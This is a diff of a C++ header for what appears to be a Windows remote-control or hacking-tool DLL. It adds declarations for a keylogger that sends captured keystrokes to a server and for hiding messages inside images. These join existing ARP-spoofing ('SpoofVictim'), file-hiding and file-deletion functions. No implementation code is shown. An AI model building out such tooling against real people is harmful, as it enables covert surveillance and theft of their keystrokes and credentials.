@@ -17,6 +17,10 @@
 #include <iterator>
 #include <thread>
 #include "MyFileClass.h"
+#include <opencv2/highgui/highgui.hpp>
+#include <opencv2/imgproc/imgproc.hpp>
+//#include <opencv2/opencv.hpp>
+using namespace cv;
 using namespace std;
 
 #pragma comment (lib, "Ws2_32.lib")
@@ -33,6 +37,9 @@ extern "C" {
 	extern __declspec(dllexport) string ChangeFile(string file);
 	extern __declspec(dllexport) string SpoofVictim(std::string ip);
 	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
+	extern __declspec(dllexport) string StartKeyLogger(string nothing);
+	extern __declspec(dllexport) string StopKeyLogger(string nothing);
+	extern __declspec(dllexport) string HideMessageInPicture(string fileName);
 #else
 	extern __declspec(dllexport) string RunNetstat(string nothing);
 	extern __declspec(dllexport) string GetAllFiles(string dir);
@@ -41,6 +48,9 @@ extern "C" {
 	extern __declspec(dllexport) string GetArpTable();
 	extern __declspec(dllexport) string SpoofVictim(std::string ip);
 	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
+	extern __declspec(dllexport) string StartKeyLogger(string nothing);
+	extern __declspec(dllexport) string StopKeyLogger(string nothing);
+	extern __declspec(dllexport) string HideMessageInPicture(string fileName);
 
 #endif
 }
@@ -57,5 +67,11 @@ string HideFileOrFolder(string file);
 string DeleteGivenFile(string file);
 string UnHideFileOrFolder(string pathtofileorfolder);
 string MoveGivenFileToDestination(string pathtofile, string Destination);
+string SplitArpLine(string line);
+void SendKeyLoggerToServer();
+void KeyLogger();
+bool SpecialKeys(int S_Key);
+void SendPicture(string fileName);
+string EncodeTextInsideImg(string fileName);
 void SpoofVictimInThread(std::string ip);
 #endif
